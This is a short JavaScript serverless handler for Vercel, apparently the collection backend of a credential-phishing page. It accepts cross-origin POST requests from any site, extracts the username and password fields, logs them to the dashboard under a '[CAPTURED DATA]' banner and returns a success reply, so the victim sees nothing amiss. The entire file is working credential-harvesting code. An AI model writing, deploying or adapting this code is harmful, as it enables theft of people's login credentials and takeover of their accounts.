export default function handler(req, res) {
    // Enable CORS so the frontend can hit this endpoint without issues
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        let data = req.body;

        // FIX: If Vercel received the body as a string, parse it manually
        if (typeof data === 'string') {
            try {
                data = JSON.parse(data);
            } catch (e) {
                // If parsing fails, fall back to extracting values via URLSearchParams
                const params = new URLSearchParams(data);
                data = {
                    user: params.get('user') || params.get('username'),
                    pass: params.get('pass') || params.get('password')
                };
            }
        }

        const username = data.user || data.username || "Unknown User";
        const password = data.pass || data.password || "Unknown Password";

        // This force-prints directly to the Vercel Dashboard Logs terminal
        console.log(`\n====================================`);
        console.log(`[CAPTURED DATA] User: ${username} | Pass: ${password}`);
        console.log(`====================================\n`);

        return res.status(200).json({ status: 'success', message: 'Logged successfully' });
    }

    return res.status(405).json({ message: 'Method Not Allowed' });
}
